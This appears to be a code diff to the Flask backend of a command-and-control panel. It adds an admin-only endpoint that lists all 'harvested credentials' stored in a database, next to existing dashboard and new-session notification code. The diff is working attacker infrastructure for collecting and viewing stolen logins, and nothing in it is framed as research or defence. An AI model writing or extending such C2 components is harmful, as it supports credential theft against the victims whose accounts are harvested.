@@ -565,6 +565,30 @@ def c2_dashboard():
         return jsonify({"status": "error", "message": f"Internal error: {str(e)}"}), 500
 
 
+@c2_bp.route('/cracked/c2/credentials', methods=['GET'])
+def get_all_credentials():
+    """Get all harvested credentials"""
+    if not session.get('cracked_admin_logged_in'):
+        return jsonify({"error": "Admin authentication required"}), 401
+    
+    try:
+        # Get all credentials
+        credentials = list(db.harvested_credentials.find().sort("timestamp", -1))
+        
+        # Convert ObjectId to string for JSON serialization
+        for cred in credentials:
+            cred["_id"] = str(cred["_id"])
+        
+        return jsonify({
+            "status": "success",
+            "credentials": credentials
+        })
+    
+    except Exception as e:
+        current_app.logger.error(f"Error getting all credentials: {str(e)}")
+        return jsonify({"status": "error", "message": f"Internal error: {str(e)}"}), 500
+
+
 def notify_admin_new_session(session_id, session_data):
     """Notify admin of new session"""
     socketio.emit('c2_new_session', {
